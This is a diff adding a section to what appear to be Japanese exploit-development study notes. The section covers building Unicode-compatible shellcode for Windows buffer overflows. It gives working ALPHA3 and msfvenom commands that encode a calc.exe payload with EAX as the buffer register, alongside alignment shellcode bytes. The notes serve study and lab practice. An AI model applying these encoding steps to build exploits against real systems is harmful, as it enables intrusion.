@@ -1974,6 +1974,22 @@ align += "\xb9\x50\xaa\xe8\x6d"                0x58 + 0x50 = 0xa8 とする！
 # eax=0012dea8 -> 0012dda8 (add 0xff) 
 align += "\xb9\x7e\xaa\xed\xec\x6d\xb9\x03\xaa\xec\x6d"
 ```
+#### Unicode対応のPayloadの作成
+メモリ内のどこかに、ShellcodeがASCIIで保存されるなら、以下みたいなのは必要ないが、そうはならず、Unicode変換されたものしかない場合は以下のようにして専用のPayloadを作成する。   
+これは、Unicode変換されて、0x00が付与されることを前提としているため、変換されなければ意味をなさない命令となってしまうことに注意   
+動いたものは以下の二つ。これら以外にもあるかもしれないが、少なくとも以下は正常に動作した。   
+
+- `python /opt/alpha3/ALPHA3.py x86 utf-16 uppercase eax --input="calc.bin"  --verbose`   
+動作は以下の説明と同じ。   
+1000バイトくらい。でかい。   
+動作検証済み(calc.exeが起動したのを見た)   
+- `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX -f py`   
+500バイトくらい。   
+シェルコード実行前にEAXにそのシェルコードの先頭アドレスを保存できている場合、`BufferRegister=EAX`を指定する。   
+すると、シェルコードの実行してすぐの処理の、「現在位置をスタック上に保存することでデコーダの場所を特定する」処理が
+必要なくなる！   
+入力がunicodeに変換されるとき、上記のエンコーダーを使える。   
+動作検証済み(calc.exeが起動したのを見た)   
 ## よく見るかたまり
 #### 関数の先頭
 ```txt
